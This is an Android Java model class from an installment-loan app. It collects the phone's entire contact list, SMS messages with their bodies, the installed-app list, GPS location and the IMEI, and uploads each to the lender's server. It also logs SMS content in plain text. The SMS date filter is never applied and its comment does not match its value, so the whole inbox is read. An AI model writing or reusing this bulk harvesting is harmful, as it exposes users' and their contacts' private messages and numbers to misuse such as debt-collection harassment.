package com.yinduowang.installment.mvp.model;

import android.annotation.TargetApi;
import android.app.Application;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.util.Log;

import com.blankj.utilcode.util.SPUtils;
import com.google.gson.Gson;
import com.jess.arms.integration.IRepositoryManager;
import com.jess.arms.mvp.BaseModel;
import com.tencent.bugly.crashreport.CrashReport;
import com.yinduowang.installment.app.constant.SPConstant;
import com.yinduowang.installment.app.utils.SignUtils;
import com.yinduowang.installment.app.utils.ToastUtils;
import com.yinduowang.installment.mvp.contract.UploadUserInfoContract;
import com.yinduowang.installment.mvp.model.entity.AppInfo;
import com.yinduowang.installment.mvp.model.entity.AppVersionEntity;
import com.yinduowang.installment.mvp.model.entity.BaseResponse;
import com.yinduowang.installment.mvp.model.entity.Contact;
import com.yinduowang.installment.mvp.model.entity.UserSmsInfoBean;
import com.yinduowang.installment.mvp.model.service.MainService;
import com.yinduowang.installment.mvp.model.service.UploadLocationService;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.inject.Inject;

import io.reactivex.Observable;


/**
 * ================================================
 * Description:
 * <p>
 * Created by MVPArmsTemplate on 03/14/2019 00:33
 * <a href="mailto:jess.yan.effort@gmail.com">Contact me</a>
 * <a href="https://github.com/JessYanCoding">Follow me</a>
 * <a href="https://github.com/JessYanCoding/MVPArms">Star me</a>
 * <a href="https://github.com/JessYanCoding/MVPArms/wiki">See me</a>
 * <a href="https://github.com/JessYanCoding/MVPArmsTemplate">模版请保持更新</a>
 * ================================================
 */
public class UploadUserInfoModel extends BaseModel implements UploadUserInfoContract.Model {
    @Inject
    Gson mGson;
    @Inject
    Application mApplication;

    @Inject
    public UploadUserInfoModel(IRepositoryManager repositoryManager) {
        super(repositoryManager);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        this.mGson = null;
        this.mApplication = null;
    }

    @Override
    public Observable<BaseResponse> uploadAddressBookToServer(String info) {
        String token = SPUtils.getInstance().getString(SPConstant.TOKEN);
        Map<String, String> map = new HashMap<>();
        map.put("info", info);
        return mRepositoryManager.obtainRetrofitService(UploadLocationService.class).uploadAddressBookToServer(info, token, SignUtils.INSTANCE.getSign(map));
    }

    @Override
    public Observable<BaseResponse> updataAllSms(String info) {
        String token = SPUtils.getInstance().getString(SPConstant.TOKEN);
        Map<String, String> map = new HashMap<>();
        map.put("info", info);
        return mRepositoryManager.obtainRetrofitService(UploadLocationService.class).uploadMsmToServer(info, token, SignUtils.INSTANCE.getSign(map));
    }

    @Override
    public Observable<BaseResponse> updataAllAppList(String info) {
        String token = SPUtils.getInstance().getString(SPConstant.TOKEN);
        Map<String, String> map = new HashMap<>();
        map.put("info", info);
        return mRepositoryManager.obtainRetrofitService(UploadLocationService.class).upAppToServer(info, token, SignUtils.INSTANCE.getSign(map));
    }

    @Override
    public Observable<BaseResponse> updataAllGPS(Map<String, String> map) {
        return mRepositoryManager.obtainRetrofitService(UploadLocationService.class).uploadLocation(
                map.get("longitude"),
                map.get("latitude"),
                map.get("address"),
                map.get("client_type"),
                map.get("device_info"),
                map.get("app_version"),
                SPUtils.getInstance().getString(SPConstant.TOKEN),
                SignUtils.INSTANCE.getSign(map));
    }

    /**
     * 获取联系人，并且上传服务器
     */
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    @Override
    public String getAllContactInfo() {
        final List<Contact> data_list = new ArrayList();
        Cursor cursor = null;
        try {
            ContentResolver resolver = mApplication.getContentResolver();
            cursor = resolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null, null);
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                Contact contact = new Contact();
                contact.setName(name);
                //去掉横线
                String number_noline = number.replaceAll("-", "");
                //去掉空格
                String number_noblank = number_noline.replaceAll(" ", "");
                //去掉86
                String number_no86 = "";
                if (number_noblank.startsWith("86")) {
                    number_no86 = number_noblank.substring(2, number_noblank.length());
                } else {
                    number_no86 = number_noblank;
                }
                //去掉+17951
                String number_no17951 = "";
                if (number_no86.startsWith("17951")) {
                    number_no17951 = number_no86.substring(5, number_no86.length());
                } else {
                    number_no17951 = number_no86;
                }
                //去掉086
                String number_no086 = "";
                if (number_no17951.startsWith("086") || number_no086.startsWith("+86")) {
                    number_no086 = number_no17951.substring(3, number_no17951.length());
                } else {
                    number_no086 = number_no17951;
                }
                //去掉+86
                String number_noplus86 = "";
                if (number_no086.startsWith("086") || number_no086.startsWith("+86")) {
                    number_noplus86 = number_no086.substring(3, number_no086.length());
                } else {
                    number_noplus86 = number_no086;
                }

                contact.setMobile(number_noplus86);
                // LogUtils.d(JSON.toJSONString(contact));
                data_list.add(contact);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Gson().toJson(data_list);
    }

    @Override
    public String getAllMsm() {
        List<UserSmsInfoBean> smsList = getSmsInfoList(mApplication);
        if (smsList == null || smsList.size() == 0) {
            return "";
        }
        return new Gson().toJson(smsList);
    }

    /**
     * 获取app列表，并且上传服务器
     */
    @Override
    public String getAllAppList() {
        final List<AppInfo> myAppInfos = new ArrayList<AppInfo>();
        try {
            List<PackageInfo> packageInfos = mApplication.getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < packageInfos.size(); i++) {
                PackageInfo packageInfo = packageInfos.get(i);
                AppInfo tmpInfo = new AppInfo();
                tmpInfo.setAppName(packageInfo.applicationInfo.loadLabel(mApplication.getPackageManager()).toString());
                tmpInfo.setPackageName(packageInfo.packageName);
                tmpInfo.setVersionCode(packageInfo.versionCode);
                tmpInfo.setVersionName(packageInfo.versionName);
                myAppInfos.add(tmpInfo);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Gson().toJson(myAppInfos);
    }

    private List<UserSmsInfoBean> getSmsInfoList(Context context) {
        List<UserSmsInfoBean> list = new ArrayList<>();
        try {
            Uri SMS_INBOX = Uri.parse("content://sms/");
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "isAuthentication"};
            String where = "date>" + (System.currentTimeMillis() - 15552000000l);//30天 = 30*24*60*60*1000ms = 2592000000ms
            Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
            if (cur != null && cur.moveToFirst()) {
                Log.e("TAG", "cur" + cur.getColumnCount());
                int phoneNumberColumn = cur.getColumnIndex("address");
                int dateColumn = cur.getColumnIndex("date");
                int bodyColumn = cur.getColumnIndex("body");
                int typeColumn = cur.getColumnIndex("isAuthentication");
                do {
                    String phoneNumber;
                    String date;
                    String body;
                    int type;
                    phoneNumber = cur.getString(phoneNumberColumn);
                    body = cur.getString(bodyColumn);
                    type = cur.getInt(typeColumn);
                    SimpleDateFormat dateFormat = new SimpleDateFormat(
                            "yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                    date = dateFormat.format(d);
                    UserSmsInfoBean mUserSmsInfo = new UserSmsInfoBean();
                    mUserSmsInfo.setMessageContent(body);
                    mUserSmsInfo.setMessageDate(date);
                    mUserSmsInfo.setMessageType(decodeSmsType(type));
                    mUserSmsInfo.setPhone(phoneNumber);
                    Log.e("LW", "输出手机中的 number=" + "--内容body=" + body + "--data=" + date + "--phoneNumber=" + phoneNumber);
                    if (list.size() <= 1000)
                        list.add(mUserSmsInfo);
                } while (cur.moveToNext());
                return list;
            } else {
                return new ArrayList<UserSmsInfoBean>();
            }
        } catch (Exception e) {
            ToastUtils.INSTANCE.makeText(mApplication, "请在设置中打开短消息权限！");
            e.printStackTrace();
            CrashReport.postCatchedException(e);
            return new ArrayList<UserSmsInfoBean>();
        }
    }

    private String decodeSmsType(int type) {
        switch (type) {
            case 1:
                return "发送";
            case 2:
                return "接收";
            default:
                return "";
        }
    }

    @Override
    public Observable<BaseResponse> saveFingerprint(String fingerToken) {
        Map<String, String> map = new HashMap<>();
        map.put("fingerToken", fingerToken);
        map.put("platformType", "2");
        return mRepositoryManager.obtainRetrofitService(UploadLocationService.class).saveFingerprint(
                fingerToken,
                "2",
                SPUtils.getInstance().getString(SPConstant.TOKEN),
                SignUtils.INSTANCE.getSign(map));
    }

    @Override
    public Observable<BaseResponse> updataPage(String pageName, String imei) {
        return mRepositoryManager.obtainRetrofitService(UploadLocationService.class).savePage(
                pageName,
                "2",
                SPUtils.getInstance().getString(SPConstant.TOKEN),
                imei);
    }

    @Override
    public Observable<BaseResponse> updataError(String errorInfo) {
        return mRepositoryManager.obtainRetrofitService(UploadLocationService.class).saveError(errorInfo, SPUtils.getInstance().getString(SPConstant.TOKEN));
    }

    @Override
    public Observable<BaseResponse<AppVersionEntity>> checkVersion() {
        return mRepositoryManager.obtainRetrofitService(MainService.class).getAppUpdataInfo("1");
    }
}